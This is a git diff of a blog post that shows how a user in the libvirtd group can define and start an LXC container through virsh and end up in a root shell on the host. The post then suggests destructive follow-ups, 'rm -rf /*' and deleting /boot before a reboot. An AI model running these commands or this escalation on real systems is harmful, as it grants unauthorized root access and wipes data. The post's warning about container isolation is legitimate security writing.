@@ -3,19 +3,21 @@ layout: post
 title: Docker Container Madness
 ---
 
-I'm unsure if this is a vulnerability on the intended behaviour of LXC/Docker. 
-Nevertheless, this harmless configuration file seems to cause A LOT of worry.
+(...Or how I got root access in less than 5 minutes)
 
-If you want to try this out, then here is the preamble if you are running a Debian-based Linux. Make sure you have the Libvirt environment variable exported to work with LXC (e.g. `LIBVIRT_DEFAULT_URI=lxc:///`, such that Libvirt doesn't go looking for Xen or KVM.
+I'm unsure if this is actually a vulnerability or just the intended behaviour of LXC/Docker. Nevertheless, this harmless configuration file seems to cause **A LOT** of worry, as I was able to elevate privileges on the host system.
+
+If you want to try this out, then here is the preamble if you are running a Debian-based Linux. 
 {% highlight bash %}
 admin@host:~$ sudo apt-get install docker virt-manager
-admin@host:~$ export LIBVIRT_DEFAULT_URI=lxc:///{% endhighlight %}
+{% endhighlight %}
 
 Create an unprivileged user, but with access to the libvirtd group:
 {% highlight bash %}
 admin@host:~$ sudo useradd -G libvirtd user 
+admin@host:~$ sudo passwd user 
 {% endhighlight %}
-Now you should login as the ordinary user. Save the following XML template, which contains a name, a memory limit, console access and a shell. E.g. container.xml
+Now you should login as the ordinary user. Save the following XML template, which contains a name, a memory limit, console access and a shell. E.g. at /tmp/container.xml
 {% highlight xml %}
   <domain type='lxc'>
 	  <name>test</name>
@@ -33,8 +35,9 @@ Import the template into Libvirt:
 {% highlight bash %}
   user@host:~$ virsh define container.xml
 {% endhighlight %}
-Start the container:
+Start the container. Make sure you have the Libvirt environment variable exported to work with LXC (e.g. **LIBVIRT_DEFAULT_URI=lxc:///**, such that Libvirt doesn't go looking for Xen or KVM.
 {% highlight bash %}
+  user@host:~$ export LIBVIRT_DEFAULT_URI=lxc:///
   user@host:~$ virsh start test
   user@host:~$ virsh console test
 {% endhighlight %}
@@ -43,7 +46,7 @@ And now run bash shell:
   Connected to domain test
   Escape character is ^]
   
-  # bash
+# bash
   bash: groups: command not found
   /bin/lesspipe: 1: /bin/lesspipe: basename: not found
   /bin/lesspipe: 1: /bin/lesspipe: dirname: not found
@@ -51,24 +54,25 @@ And now run bash shell:
   Command 'dircolors' is available in '/usr/bin/dircolors'
   The command could not be located because '/usr/bin' is not included in the PATH environment variable.
   dircolors: command not found
-  root@host:/# 
+root@host:/# 
 {% endhighlight %}
 
 Huh? You now have root on the host. 
 What kind of messed up world is this? I can read/write to any file on the host:
 
+Provide devestation:
 {% highlight bash %}
-  root@host:/# rm -rf /*
+root@host:/# rm -rf /*
 {% endhighlight %}
 
-Or alternatively have a bit of fun
+Or alternatively just cause a bit of downtime:
 {% highlight bash %}
-  root@host:/# rm /boot/*; reboot;
+root@host:/# rm /boot/*; reboot;
 {% endhighlight %}
 
 You can access everything in `/sbin`. 
 Is it possible to be careful with Docker? It doesn't seem safe for mortals.
-
+Containers do not contain.
 
 {% highlight bash %}
 # docker version
